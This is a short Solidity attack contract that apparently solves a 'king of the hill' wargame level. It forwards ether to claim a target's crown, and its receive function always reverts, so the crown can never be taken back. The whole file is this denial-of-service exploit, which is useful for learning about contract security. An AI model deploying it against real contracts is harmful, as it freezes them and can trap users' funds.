// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForeverKing {
  address immutable public owner;

  constructor () {
    owner = msg.sender;
  }

  function snatchCrown(address king) payable public {
    require(owner == msg.sender, "ERR_NOT_OWNER");
    (bool sent,) = payable(king).call{value: msg.value}("");
    require(sent, "ERR_FAIL_TRANSFER");
  }

  receive () external payable {
    revert();
  }
}
